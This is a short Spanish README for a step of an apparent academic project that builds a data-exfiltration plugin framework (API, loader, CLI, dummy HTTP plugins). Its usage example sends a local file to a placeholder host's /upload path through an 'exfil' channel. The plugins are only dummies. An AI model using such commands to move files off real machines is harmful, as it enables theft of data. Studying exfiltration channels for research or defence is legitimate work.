# TFG — Paso M2 (plugins de exfil: API + loader + CLI)

## Archivos NUEVOS / MODIFICADOS y rutas
- tfg\plugins\api.py           ← interfaces de plugins (cliente/servidor)
- tfg\plugins\errors.py        ← excepciones de plugins
- tfg\plugins\loader.py        ← descubrimiento e import dinámico desde .\plugins\
- tfg_cli.py                   ← MODIFICADO: integra resolución de plugins
- plugins\exfil\http_client_dummy.py  ← plugin dummy CLIENT (HTTP, método=1)
- plugins\exfil\http_server_dummy.py  ← plugin dummy SERVER (HTTP, método=1)

## Uso rápido (Windows, VS Code)
# Listar plugins detectados
py -3 tfg_cli.py scan-plugins --plugins-dir plugins

# Enviar con plugin (HTTP, método 1) — requiere que exista un fichero
py -3 tfg_cli.py send ^
  --transfer-id T2 ^
  --canal HTTP --metodo 1 --host example.com --puerto 443 ^
  --dest-host example.com --dest-puerto 443 --ruta /upload ^
  --cifrado NINGUNO ^
  --recurso-tipo ARCHIVO --recurso-ubicacion C:\ruta\al\fichero.txt ^
  --fragment-size 1024 ^
  --plugins-dir plugins

# Recibir con plugin (HTTP, método 1) — dummy devuelve un único chunk vacío
py -3 tfg_cli.py receive ^
  --transfer-id R2 ^
  --canal HTTP --metodo 1 --host example.com --puerto 443 ^
  --cifrado NINGUNO ^
  --plugins-dir plugins
